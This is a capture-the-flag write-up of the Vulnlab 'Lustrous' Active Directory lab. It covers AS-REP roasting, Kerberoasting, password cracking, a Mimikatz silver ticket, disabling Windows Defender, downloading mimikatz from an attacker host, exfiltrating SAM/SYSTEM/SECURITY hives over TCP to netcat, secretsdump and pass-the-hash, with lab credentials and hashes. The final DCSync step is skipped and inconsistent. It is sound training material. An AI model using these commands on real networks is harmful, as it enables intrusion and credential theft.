Lustrous is a chain machine from the [Vulnlab](https://www.vulnlab.com/). Unlike standalone machines, it consists of two machines which are linked. This post will walk you through details of how I solved this machine.

# NMAP

### 10.10.168.197

```bash
sudo nmap -sC -sV -Pn  10.10.168.197-198 --open 
```


# OUTPUT

```output
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_12-26-21  11:50AM       <DIR>          transfer
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-02 23:15:55Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: lustrous.vl0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=LusDC.lustrous.vl
| Subject Alternative Name: DNS:LusDC.lustrous.vl
| Not valid before: 2021-12-26T09:46:02
|_Not valid after:  2022-12-26T00:00:00
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: lustrous.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: LUSTROUS
|   NetBIOS_Domain_Name: LUSTROUS
|   NetBIOS_Computer_Name: LUSDC
|   DNS_Domain_Name: lustrous.vl
|   DNS_Computer_Name: LusDC.lustrous.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-10-02T23:16:02+00:00
|_ssl-date: 2025-10-02T23:16:44+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=LusDC.lustrous.vl
| Not valid before: 2025-10-01T23:14:24
|_Not valid after:  2026-04-02T23:14:24
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: LUSDC; OS: Windows; CPE: cpe:/o:microsoft:windows

```

## 10.10.168.198

```output
ORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: LUSTROUS
|   NetBIOS_Domain_Name: LUSTROUS
|   NetBIOS_Computer_Name: LUSMS
|   DNS_Domain_Name: lustrous.vl
|   DNS_Computer_Name: LusMS.lustrous.vl
|   DNS_Tree_Name: lustrous.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-10-02T23:16:03+00:00
| ssl-cert: Subject: commonName=LusMS.lustrous.vl
| Not valid before: 2025-10-01T23:14:23
|_Not valid after:  2026-04-02T23:14:23
|_ssl-date: 2025-10-02T23:16:44+00:00; 0s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-02T23:16:08
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Post-scan script results:
| clock-skew: 
|   0s: 
|     10.10.168.197
|_    10.10.168.198
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 2 IP addresses (2 hosts up) scanned in 64.55 seconds
```

As hostnames were revealed in the ssl cert, edited the hosts file to map the IP addresses and hostnames accordingly.
```bash
10.10.168.197 LusDC.lustrous.vl  lustrous.vl
10.10.168.198 LusMS.lustrous.vl   lustrous.vl
```

From the nmap scan of 10.10.168.197, there was an FTP service running and it allowed anonymous login. So we could login to the FTP as anonymous.
```bash
ftp 10.10.168.197
Connected to 10.10.168.197.
220 Microsoft FTP Service
Name (10.10.168.197:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||50101|)
125 Data connection already open; Transfer starting.
12-26-21  11:50AM       <DIR>          transfer
226 Transfer complete.
ftp> dir
229 Entering Extended Passive Mode (|||50102|)
125 Data connection already open; Transfer starting.
12-26-21  11:50AM       <DIR>          transfer
226 Transfer complete.
ftp> ls transfer
229 Entering Extended Passive Mode (|||50103|)
125 Data connection already open; Transfer starting.
12-26-21  11:51AM       <DIR>          ben.cox
12-26-21  11:49AM       <DIR>          rachel.parker
12-26-21  11:49AM       <DIR>          tony.ward
12-26-21  11:50AM       <DIR>          wayne.taylor
```

Discovered a bunch of possible usernames in the transfer directory. No other interesting data were found within the directories though. However, we got the usernames which would be useful to do further enumeration.

### AS-REP Roasting

Since we got the usernames, we could perform the AS-REP Roasting which allows us to steal the password hashes of user accounts that have Kerberos preauthentication disabled. GetNPUsers script from the impacket was used to do it, and found that ben.cox had Kerberos preauthentication disabled.

```bash
 impacket-GetNPUsers lustrous.vl/ -dc-ip lusdc.lustrous.vl -usersfile users.txt
```

```output
Impacket v0.13.0.dev0+20250528.4535.5b338613 - Copyright Fortra, LLC and its affiliated companies 

$krb5asrep$23$ben.cox@LUSTROUS.VL:7257776b28cc6575c97f7142096efc1d$021879ffe620a8d4109fd6a486684c4544aad996fd89ec5c460d1800051e7ac07bd8c0c08f683f40bd72b537bc930dca126ff76fa32c774b8bcf36552d77ab410e9d708e91c021e003e10c704182da812ace589f4c067640389e97e8df0fa2dedae30f7780af644b5a3c0f0f935244ea7ca508f52527aa8a8ff0e3a06d20190c5053100896305839837194e273b73aade9b5fcd52fee308214dcbe807e72fe56396dffe820e84a3d4f093048403ffcdc6f1be2dc7be43b43fe1eccd3fd0a5363bd03f689f7788d7be42c09a10f16f62de35c60f0f0a25d0b4310d9d3ea41df260dd596b15a3f5bb45421
[-] User rachel.parker doesn't have UF_DONT_REQUIRE_PREAUTH set
```

From the hash, it was possible to crack the plaintext password of the user.

```hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt   
```

```output
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Trinity1         ($krb5asrep$23$ben.cox@LUSTROUS.VL)     
1g 0:00:00:00 DONE (2025-10-02 19:41) 6.250g/s 371200p/s 371200c/s 371200C/s blueboy1..062906
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

After obtaining the password, we can attempt to access the hosts through protocols such as SMB and WinRM. And it was found that **ben.cox** user could login to the **lusms** host via the WinRM.

```bash
evil-winrm  -i 10.10.168.198 -u 'ben.cox' -p 'Trinity1'   
```

On the Desktop, we found an xml representation of a PSCredential Object file named **admin.xml**.

```bash
*Evil-WinRM* PS C:\Users\ben.cox\Desktop> ls


    Directory: C:\Users\ben.cox\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        12/26/2021  10:30 AM           1652 admin.xml


```

By following this [blog post](https://systemweakness.com/powershell-credentials-for-pentesters-securestring-pscredentials-787263abf9d8), we can extract the cleartext data from the file.

```bash
*Evil-WinRM* PS C:\Users\ben.cox\Desktop> $User = "LUSMS\Administrator"
*Evil-WinRM* PS C:\Users\ben.cox\Desktop> $pass= "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000d4ecf9dfb12aed4eab72b909047c4e560000000002000000000003660000c000000010000000d5ad4244981a04676e2b522e24a5e8000000000004800000a00000001000000072cd97a471d9d6379c6d8563145c9c0e48000000f31b15696fdcdfdedc9d50e1f4b83dda7f36bde64dcfb8dfe8e6d4ec059cfc3cc87fa7d7898bf28cb02352514f31ed2fb44ec44b40ef196b143cfb28ac7eff5f85c131798cb77da914000000e43aa04d2437278439a9f7f4b812ad3776345367"| ConvertTo-SecureString
*Evil-WinRM* PS C:\Users\ben.cox\Desktop> $Credential = New-Object System.Management.Automation.PSCredential($user, $pass)
*Evil-WinRM* PS C:\Users\ben.cox\Desktop> $Credential.GetNetworkCredential() | fl

```

we get our password
```bash
UserName       : Administrator
Password       : XZ9i=bgA8KhRP.f=jr**Qgd3Qh@n9dRF
SecurePassword : System.Security.SecureString
Domain         : LUSMS


```

We can then login to the host using the administrator account, and red the flag.

```bash
evil-winrm  -i 10.10.168.198 -u 'Administrator' p'XZ9i=bgA8KhRP.f=jr**Qgd3Qh@n9dRF'

```

```output

Evil-WinRM* PS C:\Users\Administrator\Desktop> cat flag.txt
VL{40a034f5c60e429d1a210f09bd3c3548}
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```

Lusms host was now completely owned as we gained administrator access to the host. Going back to the lusc host, I couldn’t find many useful things apart from some data such as usernames (including ben.cox credentials). Doing post-exploitation activities such as harvesting credentials on the lusms host didn’t find anything either. So I decided to rdp into the host using the adminstrator credentials.
```bash
xfreerdp /u:administrator /p:'XZ9i=bgA8KhRP.f=jr**Qgd3Qh@n9dRF' /w:1566 /h:968 /v:lusms.lustrous.vl:3389
```

From the nmap scan output of lusdc host, we found that there was a web server running on port 80, and 443. Upon browsing the port 80, [http://lusdc.lustrous.vl](http://lusdc.lustrous.vl/) on browser, we were greeted with a login prompt, meaning that the web app was using the Kerberos authentication.
![[Pasted image 20251003012336.png]]

As we already got some credentials, we could login to the application. Used ben.cox credentials to login, and browsing around the application didn’t find anything useful.
![[Pasted image 20251003012418.png]]
So I decide to do user enumeration within the Active Directory, and launched a cmd.exe instance in the context of ben.cox using **runas** command.

```bash
runas /user:lustrous\ben.cox cmd.exe

```

and we got new cmd shell as ben.cox so lets enumerate 
```bash
C:\Windows\system32>net user /domain
The request will be processed at a domain controller for domain lustrous.vl.


User accounts for \\LusDC.lustrous.vl

-------------------------------------------------------------------------------
Administrator            Allan.Parker             Ben.Cox
Bradley.Hancock          Brenda.Andrews           Cameron.Walsh
Colin.Dodd               Deborah.Harris           Donna.Collins
Duncan.Spencer           Guest                    Hugh.Wilkinson
Iain.Evans               Jeremy.Clark             Joanna.Hall
Joanna.Harvey            krbtgt                   Liam.Atkinson
Marian.Elliott           Michelle.John            Mitchell.Fuller
Rachel.Parker            svc_db                   svc_web
Tony.Ward                Tracy.Roberts            Wayne.Taylor
The command completed successfully.
```
Among many AD users, tony.ward seemed to be a promising one as he was a member of backup admins group. Hence, if we are somehow able to gain access to the tony.ward account, we could escalate our privileges by abusing the [backup admins privileges](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators-1).

```bash
C:\Windows\system32>net user Tony.Ward /domain
The request will be processed at a domain controller for domain lustrous.vl.

User name                    Tony.Ward
Full Name                    Tony Ward
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            12/26/2021 11:13:45 AM
Password expires             Never
Password changeable          12/27/2021 11:13:45 AM
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   12/26/2021 11:30:26 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *it
                             *Backup Admins
The command completed successfully.
```

In the AD users, I noticed that there were distinct users, **svc_db**, and **svc_web.** Those users were seemed to be using as service accounts. We can use the GetUserSPNs script from impacket to check it.
```bash
GetUserSPNs.py  lustrous.vl/ben.cox:Trinity1
```


```bash
Impacket v0.13.0.dev0+20250528.4535.5b338613 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName     Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
-----------------------  -------  --------  --------------------------  --------------------------  ----------
http/lusdc               svc_web            2021-12-22 07:46:12.670282  2025-10-02 19:16:03.713799             
http/lusdc.lustrous.vl   svc_web            2021-12-22 07:46:12.670282  2025-10-02 19:16:03.713799             
MSSQL/lusdc              svc_db             2021-12-22 07:46:34.170590  <never>                                
MSSQL/lusdc.lustrous.vl  svc_db             2021-12-22 07:46:34.170590  <never>                                

```

At this point, we can now confirm that **svc_web** was for the HTTP service while **svc_db** was for the database service.

### Kerberoasting

In Active Directory, one of the attacks that involves service account is [silver ticket attack](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets). So if we manage to get the NTLM hash of the service account, **svc_web**, we can generate a silver ticket and impersonate any user against the web application.

We can use the previous GetUserSPNs script again to perform the Kerberoasting attack
```bash
GetUserSPNs.py  lustrous.vl/ben.cox:Trinity1 -request
```

output
```output
$krb5tgs$23$*svc_web$LUSTROUS.VL$lustrous.vl/svc_web*$9deecad307967a70590ec75d3ef438f9$ec2ea951aa296830d2601106123111d72f53737667f97efbf39309e52e0eb14f403a266ab32dc9e83fed6ae988ed107e7df1671728a27245d312ad8e1cda2e5318d87ffc6af8ccac63521baef0a08bf1f84253998af697861979fbe282851be9efbc9de45ddb53251463ed0cce60d50ee73ec3aa54bc9610909f328d783f30c1bff264e4d4741df1c81291606fe741102bf32a5df7cdfd71cb8998e66ce720a11d10663f3394e27651e352642b7b861a3390bda84bd79a2a5c79c81e7e89017cf0543d19beca193a2a7048323feaaf2156985c0670b0f28718d5d6577300e5d3f51d0f70df8a44bab55b1c7b852b2ac92af2013847a0e7746ffa8b2e6249856deb1abd3d495ea3ecfb162afab6262dba307bfd63722e24516718f3adf878857be662cc384c827e0d5301ff990a7e6b8a9f847ff824721d59a654d8488d60fc789b771a57714d7d9df79ef6858b334e82c451684b51eb10806b8fdeea1147ba24856a8c4988660086671a3f2e11e8588bb767129165e258d1b67d58ca4524454effa51f3b98189a8dc115e60877e93c2069fd6d2f014cb0aa950e1b2f317c8192b9020db38158ef80e65fe7e702b8e5c9ef03077b787881bb33b8a84dba76240021de78c38ffd8e57dc17d260d604b39556f2fe550066e9868ae62fef0b2c84baaf967fef9fe73d08bacf0bdd3c08719e94869ba7ddea1828b1e47ab291afb32faa581ef61886a3fc4b320884f157694b5fca1d3e53a44278d8b268a920ba699925006330bf7223bc4a9e74e0cea3f41f3cb96686e4f0b729f54a65ac5471d0c895637f40afa96a7b180a9a99bdd70eb61efc18c904773575348604443a0eae4de2a93de71a73de45dbcd0bf3529b269170c507a7081075e6867bb73bba8e4c8782ce308526c0ec50dbc379bc86d01a6fe5c0a942a9487555b12f45a91105342eccc2c83b226a384b2478ee816de057ad33e635eae6f33f764eb2c174e036faa226c74c3993aa7000a56c9a82f5609b9ce519805f60ec5b13d4b974710acef8946f78ab4b0a581edba7f4d21b4a71d79a772d04c35844d474c74fde03d059c2770cb3745edfa50d0f096cea3213295527bd30c7295f7422c7d581a972e3d688538602a04d4dd161e4627db0123658be72dfabd3c2495838150dd3d089256cef8d4dc8762714bdad5f14567599f8d0516a34206ba8991e5762d95423b907a21eec8926e0b64f76c09104d4447a5f6c27e48a9d72df33c1af715b0fa2a87786ed361cf266840ba31d9ed5c4e10d1232164c2cd21eac1940a567ec0db931137821d4fb53d15f7ae984835b5abd19efe1ca995099e949371d5d2f329cc079bfba3b1fd59756b7519453208805d81dad36e226b635c46dc877f88cd8cc544c65fb9e18cbad4420fc0a45bfd3b9c1c232503b4d3350f60ea98e0709ea4389f0a62ba1813673d2
$krb5tgs$23$*svc_db$LUSTROUS.VL$lustrous.vl/svc_db*$22646c7a932c0142368c7ff8d71673f1$37e4edadc2706b6f058497214a7026417d66f8e50cf4a85470a45935b48648e577d845d288b5e34217953dea74a7dec3b49e3575af0b3dd6e5fe8055e24b3c2c3bd56b2680cb50f1a18c91d0dcdfc046d5e1a0fb1eba5d3fec87308e5df15584cff1352d244f39d784dd73f30652dab51ab4d02e93c1cf6fe4575b1db3cf4f0e3802a35d723b518213ae33ba2455d4fabfc46202016ffffc4e74a444f660a34cc7031fc3a8a4ee9f8ecb482055b35f9e3e3796e6527ec68e93d369595b564cd9d8452adea850df66c916aa8a9f5d4162e04edd482782ee53a1b09f10b5ca0b12ff9f79c21847c56d495d81a86936b5255152471f9d678199340577806e13e0b6dfe2fb4baee0db2c05cd3e95468f6f35b4aa092e897423f7f21c057922410a0cfa17c1dcb7f7d12d31209a5863c7500a76226b0f50eaf61917fb09dbe4f0c051d74110c5ede4757885590c03d580ef407e078bd236127d8781121c29c046f120401cf0843c1912f6aa0912e51750cad767497f4cc6e41539d26ea2209a73202baaf2450006d4ad571311f388102629e2a12b5f7fb8fe69e1e4e5ba862af455ccd7632dbf58d9ef2e864db64f8af3a954734d04637d36d20f26e5e312676696487b18c16f5229ffa0d68bf852f380004aae5057a946f98964e11e0c5dde8203f02bbcd6c032c857aee8014739ec956293a20a6d6e40855b7170e4b7517f53026534fc88fa4c009a96102794c16d14be505084dd24c8eef1ef61187eb1b10af7b8d2aae55c008a18bd82663c6db7f76a05291331d3e681c335a566c765ab1a4c412a48d7817d9569add9991ccefa24aee98aff4590f50f45fce590408930ce0a5c0a889d0035bf317ffd4d44b4f8d8d5fcda66f3b2d7296d5884de000eb5e602755c182c8a49bcb128eb98ee46088b2701c5625a99382c028f002d8e213dd7f37373644b2fe6fd0f085b77c300f936c32f1a0758ccf04864186c681e3a10a4d9bdccc6470d214c775b57527b9d33dc86650b3945994b2094a1b4fd13dfb2e98593ef7ed08ccaee1eecd97f61432e036a4dd772aa93883ee1d2de3dbf9880d2202c6b4b510d9b9ebcbf1f344f78a4d5fed796d9e0b79b1ab24a54f78056f74843498bf71d4de357ff27550ba535b1becd6c3560d8c424cb4b385f3bd7174f3a497cda675fa82497fd41801ee3055bad5d95fbd37b513dd0b5fa61c1b70a2480b7bc36d106175b00895cea9ec3f8b4f320de30fa54c2363547c16dbf7a9e39d192dc6ba24e93d03a5fb3e630baf02725fe43fe657308df6cb15d4f05e1b811c1bb9112113c0bd8b208011eaea5f4412e4806664f2c17a6edaa6916d43d8244756ac25aedebe17d561074c0e2988838b6a0681b184a6439bcc7df0ab5d7b3563505dd5120d647a593d0b47c3dd891b6355a910c5d1102c079ae86c1129e0727c481447c03b8
                                                                     

```

We were able to crack TGS ticket, and got the password of svc_web service account.

```bash
john  --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt 

```

OUTPUT
```bash
iydgTvmujl6f  
```

Since we now have the password, we can convert it into the NTLM hash  i write a script


```bash
cat convert_password_NTLM.py       

import hashlib

password = "iydgTvmujl6f"
password_bytes = password.encode("utf-16le")
md4_hash = hashlib.new("md4", password_bytes).digest()
ntlm_hash = md4_hash.hex()
print(ntlm_hash)

```

lets execute it
```
python convert_password_NTLM.py                                           
e67af8b3d78df5a02eb0d57b6cb60717
```


### Silver Ticket Attack

Now we got the NTLM hash of the svc_web service account. In order to perform the silver ticket attack, we still need to know domain, and target user SIDs. The following wmic command can be use to extract the necessary information.
```bash
wmic useraccount where name='tony.ward' get sid
```

and we get sid
```bash
S-1-5-21-2355092754-1584501958-1513963426-1114
```

After that Mimikatz can be used to perform the silver ticket attack. So we loaded the Invoke-Mimikatz.ps1 script into memory using the download cradle. Before loading the Mimikatz, make sure that Windows Defender is disabled.
```bash
Set-MpPreference -DisableRealtimeMonitoring $true

```

```bash
 powershell -c "iwr http://10.8.7.96:8081/mimikatz.exe -OutFile mimikatz.exe"

```

After that we crafted the silver ticket and injected it into memory.
```bash
kerberos::golden /domain:lustrous.vl /sid:S-1-5-21-2355092754-1584501958-1513963426 /target:lusdc.lustrous.vl /service:HTTP /rc4:e67af8b3d78df5a02eb0d57b6cb60717 /user:tony.ward /id:1114 /target:lusdc.lustrous.vl /ptt

```

lets see out ticket


```bash
PS C:\Users\Administrator> klist

Current LogonId is 0:0x2d069d

Cached Tickets: (1)

#0>     Client: tony.ward @ lustrous.vl
        Server: HTTP/lusdc.lustrous.vl @ lustrous.vl
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 10/3/2025 1:36:02 (local)
        End Time:   10/1/2035 1:36:02 (local)
        Renew Time: 10/1/2035 1:36:02 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:

```


After that we can use the PowerShell Invoke-WebRequest cmdlet with the UseDefaultCredentials flag to access the web application in the context of tony.ward user.

```bash
(iwr http://lusdc.lustrous.vl/Internal -UseBasicParsing -UseDefaultCredentials).Content
```


we get a password

```bash
 </td>
                                    <td>
                                        Password Reminder
                                    </td>
                                    <td>
                                        U_cPVQqEI50i1X
                                    </td>
                                    <td>
                                        lustrous_tony.ward
                                    </td>
                                    <td>
                                        <a class="btn btn-danger" href="/Internal/DeleteNote/4">Delete</a>
```

### Abusing the Backup Admins Privileges

Since we got the tony.ward password, we can now use it to extract SAM database from the **lusdc** host. We can leverage the [BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA) tool to do so. The tool attempts to dump the SAM file from the lusdc and export it on the remote share. So we needed to create a smb share using the smbserver script from impacket first.

```bash
reg save HKLM\SAM C:\Windows\Temp\sam.hive
reg save HKLM\SYSTEM C:\Windows\Temp\system.hive
reg save HKLM\SECURITY C:\Windows\Temp\security.hive


PS C:\Windows\Temp> $bytes = [System.IO.File]::ReadAllBytes("C:\Windows\Temp\security.hive")
PS C:\Windows\Temp> $tcpClient = New-Object System.Net.Sockets.TcpClient("10.8.7.96", 4445)
PS C:\Windows\Temp> $tcpStream = $tcpClient.GetStream()
PS C:\Windows\Temp> $tcpStream.Write($bytes, 0, $bytes.Length)
PS C:\Windows\Temp> $tcpStream.Flush()
PS C:\Windows\Temp> $tcpClient.Close()
PS C:\Windows\Temp> $bytes = [System.IO.File]::ReadAllBytes("C:\Windows\Temp\system.hive")
PS C:\Windows\Temp> $tcpClient = New-Object System.Net.Sockets.TcpClient("10.8.7.96", 4446)
PS C:\Windows\Temp> $tcpStream = $tcpClient.GetStream()
PS C:\Windows\Temp> $tcpStream.Write($bytes, 0, $bytes.Length)
PS C:\Windows\Temp> $tcpStream.Flush()
PS C:\Windows\Temp> $tcpClient.Close()
PS C:\Windows\Temp>
```

```bash
nc -lvnp 4444 > sam.hive
listening on [any] 4444 ...
connect to [10.8.7.96] from (UNKNOWN) [10.10.168.198] 61143
nc -lvnp 4445 > security.hive
listening on [any] 4445 ...
connect to [10.8.7.96] from (UNKNOWN) [10.10.168.198] 61414
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Downloads/Lusterous]
└─$ # Kali
nc -lvnp 4446 > system.hive 
listening on [any] 4446 ...
connect to [10.8.7.96] from (UNKNOWN) [10.10.168.198] 61541


```

```bash
secretsdump.py -sam ./sam.hive -system ./system.hive -security ./security.hive local
```


```output
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2be8280843a97855be7bb92d32342b63:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:d7da45674bae3a0476c0f64b67121f7d:::
[*] Dumping cached domain logon information (domain/username:hash)
LUSTROUS.VL/Ben.Cox:$DCC2$10240#Ben.Cox#662ee0721cd6c6a7d8f768fb37f444c9: (2025-10-03 00:51:34+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:7af57ed114d63553d6f47d372bb80aa9a5dc764bf7236202b74c9f214d72ffe8d5fc83ab8fe39d0e0a255ed46a74e9ed5aaf07dcfd24235abc44b4daec435e5870b44f7db9a6ca6a27092b54750aa8dc1801457784fe5c621e1b60510d4f67293a70024ad5bea92e192b95e695f54e2b9a22036eab41b66cf4c79f44693d414af6bae9f031e9202119ea6abd28639fd8d3dbeca48c3353dc73fd09c47c047b73f70c9c4e4db101865bb1d7caf5d7d7041750e6a0f1fca1f82dc5fec492a59a297f3a56dadd23a5556e3109ddc9c3909a71b8ae307f22f55050e3e1fb8456595acd038c8d37069cc4c77cec65c370d505
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:26cea3e2b594ef3f73c0183e7a419dd8
[*] DefaultPassword 
(Unknown User):Trinity1
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xd06ebd55f5ea0d82ff5eb72e70927f390fe03d18
dpapi_userkey:0x1086740d781f1765f13b693b00b90573147d06b4
[*] NL$KM 
 0000   B6 96 C7 7E 17 8A 0C DD  8C 39 C2 0A A2 91 24 44   ...~.....9....$D
 0010   A2 E4 4D C2 09 59 46 C0  7F 95 EA 11 CB 7F CB 72   ..M..YF........r
 0020   EC 2E 5A 06 01 1B 26 FE  6D A7 88 0F A5 E7 1F A5   ..Z...&.m.......
 0030   96 CD E5 3F A0 06 5E C1  A5 01 A1 CE 8C 24 76 95   ...?..^......$v.
NL$KM:b696c77e178a0cdd8c39c20aa2912444a2e44dc2095946c07f95ea11cb7fcb72ec2e5a06011b26fe6da7880fa5e71fa596cde53fa0065ec1a501a1ce8c247695
[*] Cleaning up... 

```

Although we got the local administrator hash, using that hash to gain access to the lusdc host got access denied. It was likely due to that domain administrator password is not the same. However, we can do DCSync attack using the machine account hash.

Therefore, impacket-secretsdump was once again used to perform the DCSync attack on the lusdc host .
  `a34bee37b205abb8908277c4751d79ea` we can dump the `NTDS.dit` file


```bash
evil-winrm -i 10.10.233.213 -u 'administrator' -H 'b8d9c7bd6de2a14237e0eff1afda2476'
```

we get aflag
```bash
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
VL{5384a9f4752602dd54f4c4850979da0b}


```
  















